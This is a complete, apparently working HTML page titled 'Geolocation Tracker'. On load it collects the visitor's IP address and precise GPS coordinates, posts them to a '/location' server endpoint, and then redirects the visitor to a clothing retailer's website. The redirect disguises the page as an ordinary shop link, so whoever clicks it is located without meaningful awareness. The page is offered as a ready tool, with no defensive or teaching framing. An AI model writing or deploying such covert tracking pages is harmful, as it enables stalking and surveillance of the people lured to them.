<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation Tracker</title>
</head>
<body>
    <script>
        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        async function startTracking() {
            const ip = await getIP();
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    sendLocation(position, ip);
                    window.location.href = "https://www.peacocks.co.uk";
                }, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendLocation(position, ip) {
            const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
            const accuracy = position.coords.accuracy;

            fetch('/location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ip, location, accuracy })
            }).then(response => {
                if (response.ok) {
                    console.log('Location data sent successfully');
                } else {
                    console.error('Failed to send location data');
                }
            });
        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("User denied the request for Geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }

        // Start tracking immediately
        startTracking();
    </script>
</body>
</html>
